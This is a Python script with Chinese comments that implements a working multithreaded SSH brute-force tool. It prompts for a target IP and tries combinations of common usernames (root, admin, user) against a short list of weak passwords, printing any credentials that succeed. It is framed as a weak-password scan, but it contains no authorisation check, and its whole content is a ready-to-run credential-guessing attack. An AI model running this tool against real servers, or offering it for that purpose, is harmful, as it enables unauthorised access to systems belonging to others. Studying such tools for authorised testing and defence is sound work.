import paramiko
from concurrent.futures import ThreadPoolExecutor

# 預設最大執行緒數（提高速度）
MAX_THREADS = 10

def try_ssh_login(ip, username, password, port=22):
    """
    嘗試使用 paramiko 對 SSH 主機登入
    """
    try:
        # 建立 SSH client
        ssh = paramiko.SSHClient()
        # 自動接受未知主機金鑰
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # 嘗試登入
        ssh.connect(ip, port=port, username=username, password=password, timeout=3)
        # 成功登入會執行到這裡
        print(f"[+] 成功登入：{ip} - {username}:{password}")
        ssh.close()
        return {"ip": ip, "username": username, "password": password, "success": True}
    except paramiko.AuthenticationException:
        # 認證失敗
        return {"ip": ip, "username": username, "password": password, "success": False}
    except Exception as e:
        # 其他錯誤（連線逾時、主機拒絕等）
        print(f"[!] 錯誤：{ip} - {username}:{password} => {e}")
        return {"ip": ip, "username": username, "password": password, "success": False}

def ssh_brute_force(ip, usernames, passwords):
    """
    嘗試所有帳號密碼組合，使用 ThreadPoolExecutor 並行化
    """
    results = []
    print(f"[+] 開始對 {ip} 進行 SSH 弱密碼掃描...")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(try_ssh_login, ip, username, password))

        for future in futures:
            result = future.result()
            if result["success"]:
                results.append(result)

    return results

# 測試範例（可直接執行此模組）
if __name__ == "__main__":
    ip = input("請輸入目標 SSH IP： ")
    
    # 簡易帳號密碼清單（可替換為外部檔案讀取）
    usernames = ["root", "admin", "user"]
    passwords = ["123456", "admin", "password", "toor"]

    result = ssh_brute_force(ip, usernames, passwords)

    if result:
        print("\n[+] 發現有效帳密：")
        for r in result:
            print(f"  - {r['username']} : {r['password']}")
    else:
        print("[-] 未發現可登入的帳密組合")
